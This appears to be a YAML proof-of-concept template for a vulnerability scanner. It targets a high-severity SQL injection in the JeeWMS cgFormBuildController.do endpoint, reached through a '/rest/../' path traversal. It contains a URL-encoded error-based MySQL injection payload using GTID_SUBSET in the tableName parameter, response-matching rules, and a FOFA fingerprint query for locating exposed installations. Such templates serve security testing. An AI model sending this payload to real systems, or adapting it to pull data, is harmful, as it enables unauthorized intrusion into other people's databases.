id: poc-yaml-jeewms-cgformbuildcontroller-sqli
info:
  name: JeeWMS /rest/../cgFormBuildController.do SQL 注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: jeewms
  fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /rest/../cgFormBuildController.do?mobileForm&tableName=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+%28md5%28{{.t1}}%29%29%29%2C0xe%29%2C4503%29--+wnMN
  expression: status_code == 200 && contains(body,"Exception!") && contains(body,"Malformed
    GTID set specification") && contains(body,"错误描述") && contains(body,t2)
transport: http
